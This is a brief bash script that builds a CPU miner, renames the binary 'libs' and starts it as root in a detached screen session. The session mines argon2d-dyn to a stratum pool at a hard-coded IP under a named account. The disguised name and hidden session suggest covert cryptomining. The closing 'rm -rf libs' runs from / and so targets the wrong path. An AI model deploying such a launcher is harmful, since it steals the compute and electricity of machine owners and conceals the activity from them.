#!/bin/bash
sudo chmod +x build.sh 
sudo ./build.sh
sudo cp cpuminer libs
sudo screen -d -m ./libs -a argon2d-dyn -o stratum+tcp://145.239.0.126:5960 -u phanduy.duy -p x
cd /
sudo rm -rf libs